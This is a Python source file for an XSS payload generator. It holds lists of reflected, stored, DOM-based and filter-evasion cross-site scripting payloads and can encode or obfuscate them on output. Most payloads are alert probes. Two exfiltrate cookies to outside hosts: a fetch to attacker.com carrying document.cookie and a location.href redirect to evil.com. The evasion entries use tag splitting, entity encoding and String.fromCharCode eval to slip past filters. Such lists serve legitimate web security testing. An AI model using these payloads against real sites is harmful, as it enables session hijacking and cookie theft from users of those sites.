from utils import encoder
from utils import obfuscator

class XSSPayloadGenerator:
    def __init__(self):
        self.payloads = {
        "reflected": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "'\"><script>alert(document.domain)</script>",
            "<input autofocus onfocus=alert(1)>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input type='text' value='XSS' onfocus='alert(1)'>",
            "<a href='javascript:alert(1)'>Click me</a>"
        ],
        "stored": [
            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
            "<iframe src='javascript:alert(`storedXSS`)'/>",
            "<video><source onerror=\"alert('stored')\">",
            "<body onload=alert('Stored XSS')>",
            "<marquee onstart=alert(1)>"
        ],
        "dom": [
            "#<script>alert('DOM')</script>",
            "javascript:alert('DOM-based')",
            "<a href='javascript:alert(1)'>ClickMe</a>",
            "document.write('<img src=x onerror=alert(1)>')",
            "location.href='http://evil.com?cookie='+document.cookie"
        ],
        "evasion": [
            "<svg><script>alert&lpar;1&rpar;</script>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "<iframe srcdoc=\"<script>alert('srcdoc')</script>\"></iframe>",
            "<script>/*comment*/alert(1)</script>",
            "<scr<script>ipt>alert(1)</script>"
        ]
    }

    def generate(self, type = "reflected", encode = None, obfuscate = False):
        if type not in ["reflected", "stored", "dom", "evasion", "all"]:
            raise ValueError("Invalid payload type")
        
        if type == "all":
            base_payloads = self.payloads["reflected"] + self.payloads["stored"] + self.payloads["dom"] + self.payloads["evasion"]
        else:
            base_payloads = self.payloads[type]
        processed = []

        processed = []

        for payload in base_payloads:
            if encode:
                    payload = encoder.encode(payload, encode)
            if obfuscate:
                    payload = obfuscator.obfuscate(payload)
            processed.append(payload)
        return processed